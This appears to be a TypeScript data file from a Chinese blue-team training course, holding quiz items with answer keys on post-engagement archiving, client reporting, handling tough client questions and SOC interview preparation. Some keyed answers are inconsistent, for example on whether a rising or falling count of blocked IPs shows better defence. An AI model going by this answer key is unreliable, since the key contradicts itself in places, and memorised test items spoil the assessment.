      {question:'全套技战法/SOP/报告统一归档的核心目的是什么？',options:['满足档案管理要求','知识传承——下次护网时可以直接复用和迭代这些文档，不需要从零开始','只是为了凑材料','存档后就不会再看'],correctIndex:1,explanation:'归档=知识库建设。今年护网的所有经验教训→存档为技战法和SOP→明年护网在新人的电脑上直接打开用=组织的安全能力在积累而非停留在个人脑子里。'},
      {type:'fill',question:'归档文件应按照___分类（如按攻击类型：SQL注入/Webshell/暴力破解）或按___分类（如按护网阶段：战前/战中/战后），方便后续检索。',correctAnswer:'攻击类型/时间阶段',explanation:'分类归档=可检索的知识库。建议同时建立索引文档，列出所有归档文件名称+简短描述+适用场景，让新人可以在10分钟内找到需要的文档。'},
      {type:'boolean',question:'护网结束后，只需要归档处置成功的案例，失败的案例不需要保留。',options:['正确','错误'],correctIndex:1,explanation:'错误！失败的案例=最具教训价值的档案。被攻破的原因、怎么发现的、为什么发现晚了——这些"反面教材"的价值有时比成功案例更大。'},
      // 改进计划
      {question:'好的改进计划最重要的是什么？',options:['列了很多项','每项改进有明确的行动计划（做什么→谁来做→什么时候做完→如何验证效果），而不是空洞的建议','只看眼前','不需要时间表'],correctIndex:1,explanation:'可执行+可追踪=好改进计划。"加强监控"=空话，"在SIEM中新增3条关联规则（责任人张三，7月15日前完成，验收标准：检测到测试攻击时产生告警）"=可执行计划。'},
      {type:'multiple',question:'护网结项后，改进计划通常应涵盖哪些层面？（多选）',options:['技术层面（补工具短板、增强监控覆盖率）','流程层面（优化SOP、完善交接机制）','人员层面（技能提升培训安排）','管理层面（优化考核和激励机制）'],correctIndices:[0,1,2,3],explanation:'改进应全方位：技术+流程+人员+管理。护网暴露的问题往往不限于技术，流程衔接不上、人员能力不足、管理混乱都是常见根因。'},
      {type:'fill',question:'结项报告中的"___"部分应坦诚面对护网期间暴露的所有问题，而不是掩饰或轻描淡写。',correctAnswer:'不足与短板',explanation:'"不足分析"的坦诚程度=乙方专业度的直接体现。甲方不傻，你藏着掖着不说、甲方其实也知道——坦诚面对反而更受信任。'},
      {question:'护网项目结项报告中，防守成果部分用什么样的数据呈现方式最有说服力？',options:['纯文字描述','趋势图表+对比数据（护网前后/逐日趋势/与行业平均对比）','只有总数没有趋势','不需要数据'],correctIndex:1,explanation:'图表>文字，趋势>总数。封禁IP总量10万=不错，封禁IP从首日500涨到后期2000+日均早期攻击被大量拦截趋势=非常好。趋势展现的是蓝队"越战越强"。'},
      // 防守成果总结
      {type:'fill',question:'防守成果总结中最有力的论证方式是展示___趋势——说明蓝队的防御能力在护网过程中不断提升。',correctAnswer:'MTTD下降/检测速度',explanation:'MTTD下降曲线="我们越来越快了"。Day1平均2小时检测→Day14平均20分钟→Day28平均8分钟。这个趋势胜过任何华丽的词藻。'},
      {question:'以下哪个数据最能直接体现蓝队的"主动防御"能力（而非被动处置）？',options:['收到的告警总数','主动发现并处置的攻击事件数量（非设备自动告警）','封禁的IP总数','上报的事件数'],correctIndex:1,explanation:'主动发现=分析师通过威胁狩猎(Threat Hunting)而非被动接收告警发现的攻击。这是中级→高级岗的核心能力标志之一。'},
      {type:'boolean',question:'防守成果中应该把因WAF/IPS自动阻断而从未产生真实威胁的攻击也计入"成功防御"。',options:['正确','错误'],correctIndex:0,explanation:'正确。被自动阻断=防御成功（攻击没打进来）。但也要区分：如果WAF挡住了1万条盲扫和挡住了100次手工作业的定向攻击，前者更体现设备的容量，后者更体现规则的精准度。'},
      {question:'为什么结项报告中的"后续改进计划"比单纯汇报战果更有长期价值？',options:['甲方只看战果','战果是过去的成绩，改进计划决定了下一次护网能不能取得更好的成绩——成长比成绩更重要','改进计划只是为了凑篇幅','没必要写改进计划'],correctIndex:1,explanation:'改进计划=对未来的投资。甲方真正关心的是：经过这次护网，我的安全能力有没有实质提升，下次护网能不能打得更漂亮。'},
      {type:'multiple',question:'以下哪些指标能体现蓝队值守的"效率"而非仅仅"工作量"？（多选）',options:['MTTD(平均检测时间)','MTTR(平均响应时间)','每人每天处理的告警数','成功入侵次数'],correctIndices:[0,1],explanation:'MTTD/MTTR=效率指标（干得快不快）。处理的告警数=工作量（干了多少活），成功入侵次数=结果指标（活干得好不好）。三者结合才是全维度评估。'},
      {type:'fill',question:'护网项目归档文件的命名规范建议包含：日期、___、版本号和作者。如 20240615_暴力破解处置SOP_v2.1_张三.docx。',correctAnswer:'文档类型/文档名',explanation:'规范化命名=可管理性基础。混乱的文件名（新建文档(3).docx）在紧急时刻让你找不到关键文件。'},
      {type:'boolean',question:'护网结项报告写好后就万事大吉，不需要和甲方做正式的交底会。',options:['正确','错误'],correctIndex:1,explanation:'错误！交底会=让甲方真正理解和认可你的工作。书面报告甲方可能一看而过，但面对面讲15分钟可以让甲方深刻记住你的成果和诚意。'},
      {question:'结项报告中"不足分析"的目的是为了谁？',options:['为了让甲方看笑话','为了自我提升——诚实面对薄弱环节才能在下次护网中改进','只是为了凑篇幅','给领导看'],correctIndex:1,explanation:'不足分析受众=自己团队。但甲方也乐意看到乙方有自省能力。一个会说"我们这里没做好、下次会怎样改进"的团队，比一个"我们做得完美无缺"的团队更值得信赖。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-27', day: 27,
    title: '甲方汇报演练与沟通技巧',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['输出汇报PPT+汇报稿+标准问答库', '完成PPT演示+QA应答', '准备常见尖锐问题的应答话术'],
    keyPoints: ['面向甲方的汇报技巧', '10分钟汇报PPT结构', '模拟问答（"为什么没防住？""投入产出比？"）', '标准问答库建设'],
    content: `# Day 27：甲方汇报演练与沟通技巧

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 核心学习内容
- 视频：面向甲方的汇报技巧
- 新增：制作10分钟汇报PPT与讲稿，模拟问答环节（如"为什么没防住"）

## 🔧 实操任务
- 模拟正式汇报场景
- 完成PPT演示+QA应答

## ✅ 验收标准
- 输出汇报PPT + 汇报稿 + 标准问答库`,
    quiz: [
      // 汇报技巧
      {question:'面对甲方"为什么没防住这次攻击"的质疑，以下哪种应答最专业？',options:['推说是安全设备的问题','承认不足→说明改进措施→展示改进后效果→提出持续优化计划','说攻击者水平太高防不住正常','回避问题，转移话题说其他方面做得好'],correctIndex:1,explanation:'专业应答四步法=承认不足+说明改进+展示效果+持续计划。展现专业度和持续改进的态度，而非推诿回避。'},
      {type:'multiple',question:'面向甲方的10分钟汇报PPT核心结构应包含哪些？（多选）',options:['项目概况与背景','防守成果与核心数据','不足分析与改进方案','后续安全建设建议'],correctIndices:[0,1,2,3],explanation:'完整汇报结构=背景概况+核心数据成果+不足分析+改进建议。每部分2-3页，共10-12页，控制在10分钟内讲完。'},
      {type:'boolean',question:'在向甲方汇报时，面对尖锐问题（如"安全投入这么大为什么还有问题"），最佳策略是直接回避不回答。',options:['正确','错误'],correctIndex:1,explanation:'错误。回避会让甲方更加不信任。正确做法：直面问题+承认现状+展示已采取措施+给出下一步计划。'},
      {type:'fill',question:'汇报中的核心数据展示应包含____个可量化指标（如封禁IP数/处置事件数/MTTD/MTTR），用数据支撑成果。',correctAnswer:'4',explanation:'四大核心量化指标：封禁IP数、处置事件数、MTTD、MTTR。数据可视化（图表）比文字更有说服力。'},
      // 汇报PPT
      {question:'面向甲方的10分钟汇报PPT中，哪部分应该占据最多时间？',options:['团队介绍','防守成果与核心数据（约4-5分钟）','项目背景','公司介绍'],correctIndex:1,explanation:'成果数据=汇报的核心，甲方最关心的就是"我花钱得到了什么"。建议：背景1-2分钟+成果4-5分钟+不足与分析2-3分钟+建议1-2分钟 + QA。'},
      {type:'fill',question:'甲方汇报PPT第一页应该是___，用一句简洁有力的话总结本次护网的核心成果。',correctAnswer:'核心结论/Executive Summary',explanation:'第一页=核心结论。甲方高管可能只看这一页（时间不够）。一句话说清：打了多少攻击、防住了多少、关键数据、总体评价。'},
      {question:'向甲方展示防守数据时，哪类图表最有说服力？',options:['纯文字列表','趋势图（如MTTD逐日下降曲线）+对比图（与行业/历史对比）+分布图（攻击类型分布）','只有总数没有趋势','不需要图表'],correctIndex:1,explanation:'趋势+对比+分布=数据三件套。趋势=我们在进步，对比=我们比平均水平好，分布=告诉我们攻击重点在什么地方。'},
      {type:'boolean',question:'甲方汇报中应该多用专业术语和安全行业黑话，显得很专业。',options:['正确','错误'],correctIndex:1,explanation:'错误！甲方不一定是安全专业人士。用术语可以，但要解释——"我们实现了MTTD从2小时降到30分钟，也就是从攻击发生到我们发现，平均只需要30分钟了"。'},
      // 尖锐问题及应对
      {question:'被甲方问到"你们防住了99%的攻击，但丢的1%是最重要的数据，这怎么解释？"最佳回答思路是什么？',options:['推说技术限制','承认不足→分析那1%为什么漏了→针对这1%的专项改进方案→改进后的验证结果→确保下次同样手法的攻击不再发生','说"这个无法保证100%"','转移话题说99%已经很好了'],correctIndex:1,explanation:'面对最尖锐的问题=坦诚+具体+有方案。不说"做不到100%"，而是说"这1%暴露了我们防御体系的缺陷X，我们已经做了Y改进，验证了可以挡住这1%。"'},
      {type:'fill',question:'甲方问"安全投入产出比(ROI)怎么衡量"，最佳回答：可以用___指标（避免了多大的数据泄露损失）和___指标（MTTR缩短了多少人天的工作量）来量化。',correctAnswer:'定性/定量',explanation:'ROI=定性(避免了什么损失)+定量(节省了多少成本)。如"因及时检测阻止了可能泄露X万条用户数据的攻击"+"自动化处置节省了Y人天的分析工作量"。'},
      {question:'甲方问"如果下次护网我给你双倍预算，你会在哪些方面投入？" 这个问题的陷阱是什么？',options:['没有陷阱','甲方在考察你是否真的理解了本次护网的薄弱环节——你的回答必须精准命中本次暴露的核心短板，而不是泛泛而谈','甲方在耍你','甲方想省钱'],correctIndex:1,explanation:'预算问题=能力测试。甲方在问"你知不知道问题在哪"。好的回答=基于本次护网数据的精准建议，如"我们的核心短板是X类型攻击的检测能力不足，建议投入在Y工具上"而不是"多买设备"。'},
      // 标准问答库
      {question:'为什么要提前准备标准问答库？',options:['应付检查','避免被尖锐问题问到语塞——提前想好会有什么问题、怎么回答、用哪些数据支撑','展示准备充分','所有问题都能预料到'],correctIndex:1,explanation:'问答库=演练过的话术。你不一定遇到题库里的每个问题，但准备过程让你理清了所有可能被质疑的点，建立了回答的逻辑框架。'},
      {type:'multiple',question:'标准问答库中应包含哪些类型的问题和回答？（多选）',options:['攻击防御类（"这次攻击你们怎么防的？"）','资源投入类（"为什么需要这个预算？"）','技术能力类（"你们能应对APT吗？"）','管理改进类（"下次如何做得更好？"）'],correctIndices:[0,1,2,3],explanation:'问答库应覆盖技术+管理+资源+改进四个维度。每道题准备：问题+回答逻辑(点一二三)+数据支撑+一句话总结。'},
      {type:'fill',question:'PPT汇报的最后应留___分钟给甲方提问，而不是把10分钟全占满。',correctAnswer:'2-3/2到3',explanation:'留提问时间=展示自信。全部时间用光=像是在给甲方灌输信息，留出互动时间=展开有价值的高层对话。'},
      // 汇报演练
      {question:'汇报演练中，最常见的错误是什么？',options:['照着PPT念（完全没有额外的解释和故事）','超时','用数据说话','准备数据不够'],correctIndex:0,explanation:'照念=浪费PPT。甲方自己看就行。你的价值在于PPT没有的信息：数据背后的故事、现场经历的经验、你没写在纸上的洞察。'},
      {type:'boolean',question:'护网汇报PPT只需要列出数据，不需要讲"这数据意味着什么"。',options:['正确','错误'],correctIndex:1,explanation:'错误！数据+解读=价值。"封禁区IP 10万个"=数据，"这说明攻击者尝试了大量不同的IP，但在我们的多层封禁策略下，99.5%的攻击尝试在第一步就被过滤掉了"=解读。'},
      {question:'汇报中发现甲方对自己的技术方案表现出困惑，应该怎么处理？',options:['继续用技术术语讲','切换到比喻和通俗语言——用日常生活中的例子解释安全概念','加快速度跳过','只让甲方自己理解'],correctIndex:1,explanation:'甲方困惑=你的沟通失败了。立即降维——用通俗比喻："这就像给房子装了防盗门(防火墙)+监控摄像头(IDS)+报警系统(SIEM)+门窗传感器(EDR)"。'},
      {type:'fill',question:'汇报中展示"封禁IP数量和变化趋势"时，应强调___趋势（说明蓝队防御越来-越有效），而不仅仅是总量。',correctAnswer:'下降/改善',explanation:'封禁IP数量下降+攻击检测率上升=蓝队越来越精-准：封得少但挡得多。封禁IP数量持续飙升可能说明防了一批又来一批，策略不够根本。'},
      {question:'作为蓝队乙方，向甲方做结项汇报的核心目标是什么？',options:['炫耀技术','让甲方认可你的工作价值、信任你的专业能力、愿意继续和你合作或采纳你的安全建议','如实汇报所有数据','满足合同要求'],correctIndex:1,explanation:'汇报=建立信任。甲方不需要知道你用了什么技术。甲方需要知道：你保护了我的资产吗？你能看到我看不到的风险吗？你有能力让我下次更安全吗？'},
      {type:'boolean',question:'向甲方汇报时应该只展示做的好的地方，有缺陷的地方轻描淡写带过即可。',options:['正确','错误'],correctIndex:1,explanation:'错误！坦诚面对不足+给出改进方案=最有力的自信展现。护网攻防本质上不是比较谁没有失败，而是比较谁面对失败的态度——回避比承认更伤人品。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-28', day: 28,
    title: '终极考核 + 面试实战验收',
    subtitle: '全流程模拟与统筹沉淀周（高级岗全能力达标）',
    objectives: ['完成4小时终极闯关考核', '流畅回答80%蓝队面试题', '输出全周期学习复盘报告和后续实战提升计划'],
    keyPoints: ['全知识点笔试', '应急场景现场操作', '10分钟结项汇报', '蓝队高频面试题', '简历优化建议'],
    content: `# Day 28：终极考核 + 面试实战验收

> **阶段**：全流程模拟与统筹沉淀周（高级岗全能力达标）

## 📚 考核内容
- 融合考核：
  ① 全知识点笔试
  ② 随机抽选应急场景处置（现场操作）
  ③ 10分钟结项汇报
- 新增：
  ④ 初级/高级蓝队高频面试题对答（含简历优化建议）

## 🔧 实操任务
- 完成4小时终极闯关考核

## ✅ 验收标准
- 输出《全周期学习复盘报告》+《后续实战提升计划》
- 流畅回答80%面试题`,
    quiz: [
      // 面试实战
      {question:'蓝队面试中，以下哪个回答最能体现你的护网实战能力？',options:['"我看了很多护网视频"','"我在模拟环境中完成过完整的应急响应，从告警研判到溯源报告全流程"','"我背了很多概念"','"我有CISP证书所以一定能胜任"'],correctIndex:1,explanation:'面试官最看重实战经历。用具体事件（告警→研判→处置→溯源→报告全流程）来证明能力，而非空谈理论或证书。'},
      {type:'boolean',question:'28天速成计划毕业后就可以直接胜任高级护网工程师岗位。',options:['正确','错误'],correctIndex:1,explanation:'错误！28天速成目标是初级蓝队值守/SOC运营岗上岗。高级岗需要持续实践和积累，通常需3-6个月以上。'},
      // 面试高频题
      {question:'面试时被问到"你处理过最复杂的安全事件是什么"，最佳回答结构是什么？',options:['"我没有处理过"','STAR法则：描述场景(Situation)→你的任务(Task)→你采取的行动(Action)→取得的结果(Result)→学到的教训(Learn)','"都很简单没什么复杂的"','背一个别人的案例'],correctIndex:1,explanation:'STAR+L=面试结构化回答黄金法则。用具体的、细节清晰的真实经历（哪怕是模拟环境中的），证明你真正理解和掌握了应急响应的全过程。'},
      {question:'被问"如果护网期间你发现了一个之前没人注意到的安全漏洞，但修补它可能需要中断业务，你怎么办？"最佳回答是什么？',options:['"不管，关掉再说"','"评估风险+及时上报+提出方案（临时缓解+计划修复窗口）+让决策层做权衡"','"假装没发现"','"等护网结束再说"'],correctIndex:1,explanation:'安全不是非黑即白。好的面试回答=展现出"理解风险管理"的思维——不是自己拍板，而是给出专业建议+风险分析+可选项，让有权限的人决策。'},
      {type:'fill',question:'蓝队面试经典问题："描述TCP三次握手的过程"——第一步：客户端发___，第二步：服务器回___，第三步：客户端发___。',correctAnswer:'SYN/SYN+ACK/ACK',explanation:'三次握手=SYN→SYN+ACK→ACK。这是蓝队面试中最基础的网络题，必须能做到秒答。'},
      {type:'fill',question:'面试中被问到："IDS和IPS的区别？"——核心回答：IDS是___部署只___，IPS是___部署可___。',correctAnswer:'旁路/告警/串联/阻断',explanation:'IDS=旁路检测告警，IPS=串联在线阻断。这个区别是最常见面试题之一，要能一句话说清。'},
      {question:'面试官问："你对我们公司的安全建设有什么建议吗？" 你应对该公司的安全体系一无所知，正确回答是？',options:['"你们安全做的太差了"','"不了解具体情况不好贸然建议，但我可以先问几个问题了解贵司现状：主要业务类型？目前已有安全措施？遇到的主要安全挑战？"','"都挺好的"','"建议买最贵的安全设备"'],correctIndex:1,explanation:'谦虚+专业=好印象。不装作知道、不胡乱建议、先了解再发言。同时展现你懂得安全建设应从了解现状开始。'},
      // 全知识点综合考核
      {question:'以下哪些属于PDCERF应急响应六阶段？（多选）',options:['准备(Prepare)','检测(Detect)','遏制(Contain)','根除(Eradicate)','恢复(Recover)','跟踪(Follow-up)'],correctIndices:[0,1,2,3,4,5],explanation:'PDCERF=准备→检测→遏制→根除→恢复→跟踪，六阶段缺一不可。'},
      {type:'multiple',question:'Kill Chain七阶段按正确顺序排列是？（多选，选出正确的几个阶段）',options:['侦察(Reconnaissance)','武器化(Weaponization)','投递(Delivery)','利用(Exploitation)','安装(Installation)'],correctIndices:[0,1,2,3,4],explanation:'正确顺序=侦察→武器化→投递→利用→安装→C2→行动。前五个阶段列举正确。'},
      {type:'fill',question:'ATT&CK中，___是指攻击者要达到的战术目标（如Initial Access、Persistence），___是指攻击者实现该目标的具体技术手段（如T1566.001=鱼叉附件）。',correctAnswer:'Tactic/Technique',explanation:'Tactics=目标意图（WHAT），Techniques=技术方法（HOW）。例如：Tactic=持久化，Technique=注册表Run键/计划任务。'},
      // 全周期复盘
      {type:'fill',question:'28天学习结束后，应对照___阶段的学习目标进行自我评估，确认每个阶段的能力目标是否达标。',correctAnswer:'四个',explanation:'四个阶段=基础夯实(1-7)+实战进阶(8-14)+高阶攻坚(15-21)+全流程模拟(22-28)。每个阶段有明确的能力门槛。'},
      {question:'"全周期学习复盘报告"的核心价值是什么？',options:['证明学了28天','诚实评估学习效果：哪些知识点已牢固掌握、哪些还需强化、后续提升计划','只是为了存档','应付考核'],correctIndex:1,explanation:'复盘报告=诚实的自我评估。不只是"我学完了"，而是"我掌握了什么+我还缺什么+我接下来要补什么"。对自己诚实才能持续进步。'},
      {type:'boolean',question:'28天速成计划毕业后就可以停止学习了，因为已经"上岗达标"。',options:['正确','错误'],correctIndex:1,explanation:'错误！安全是持续学习的过程。28天是"上岗起点"，不是终点。新技术、新漏洞、新攻击手法不断涌现，保持学习是安全从业者的基本素养。'},
      // 能力评级
      {question:'28天速成后，以下哪项能力属于已掌握范围？',options:['独立设计企业级SOC体系','独立完成告警研判四步法、日志分析、IP封禁、基础事件处置、日报撰写','独立APT溯源到攻击组织','编写0day漏洞利用'],correctIndex:1,explanation:'28天速成目标=初级值守岗位能力。高级攻防和APT溯源属于更高阶段的学习内容。'},
      {type:'multiple',question:'28天速成后的能力模型包含哪些？（多选）',options:['网络协议基础→识别TCP异常','安全设备认知→独立封禁IP/查情报','告警研判→PDCERF全流程','进阶能力→多源日志关联+技战法编写'],correctIndices:[0,1,2,3],explanation:'以上四项=从基础到进阶的能力链。完成后可胜任初级→初中级蓝队值守/SOC运营岗位。'},
      // 简历优化
      {question:'面试时简历上写"在模拟环境中完成了28天护网实战训练"，面试官问"模拟环境与真实护网有什么区别"，最佳回答是？',options:['"没有区别"','"模拟环境提供了结构化的学习路径和安全试错空间，真实环境需要更快节奏和更大压力。但我通过模拟打好了基本功，随时准备在真实战场上检验"','"模拟环境更好"','"不懂"'],correctIndex:1,explanation:'诚实+自信=好回答。承认模拟和真实的差异→同时表达模拟的价值（系统化训练打好基础）→表达对真实环境的期望和准备。'},
      {type:'fill',question:'28天速成计划的最终目标不是让你成为技术最强的安全专家，而是让你具备___的能力。',correctAnswer:'上岗/入职/胜任岗位',explanation:'28天目标=能干活。具备独立值守、处理告警、应急响应的基本能力，达到初级蓝队岗位的录用标准。'},
      {type:'boolean',question:'面试时展现你在28天学习中的具体实操经验（如搭建过靶场、抓过包、分析过日志、写过SOP）比背诵一堆概念强100倍。',options:['正确','错误'],correctIndex:0,explanation:'正确。面试官最看重的永远是"你做过什么"。具体的实操细节比空洞的理论概念有说服力得多。'},
      {question:'蓝队面试经典问题："在Wireshark中看到大量的TCP重传，这说明了什么？"应该回答？',options:['"Wireshark有问题"','"网络存在丢包或拥塞，需要进一步排查网络设备状态"','"说明攻击者在扫描"','"不懂"'],correctIndex:1,explanation:'TCP重传=网络丢包/延时的信号。面试中要展现你"看到现象→分析原因→排查思路"的能力。'},
      {type:'fill',question:'面试结束时，"你有什么想问我们的"——应至少问___个关于团队/工作内容的问题，展现你对岗位的真实兴趣和理解。',correctAnswer:'2-3/两到三个',explanation:'主动提问=展示你对岗位的认真思考。如"团队目前主要用什么SIEM平台？"、"护网期间团队的班次安排是什么？"。不提问=显得不关心。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

];

export const cyberHwExpress28Plan: CyberLearningPlan = {
  id: 'hw-express',
  name: '护网行动专项（速成版）',
  subtitle: '28天极速上岗路径',
  description: '28天速成路径，学完即可胜任护网值守、初级SOC运营岗位。适合快速上岗需求，Day1-Day14严格零基础可跟学。',
  difficulty: '高级',
  totalDays: 28,
  icon: '⚡',
  color: 'text-cyber-gold',
  bgColor: 'bg-cyber-gold/10',
  borderColor: 'border-cyber-gold/30',
  prerequisites: ['零基础可学，无需前置知识'],
  certification: '初级蓝队值守 / SOC运营岗',
  days: allDays,
};
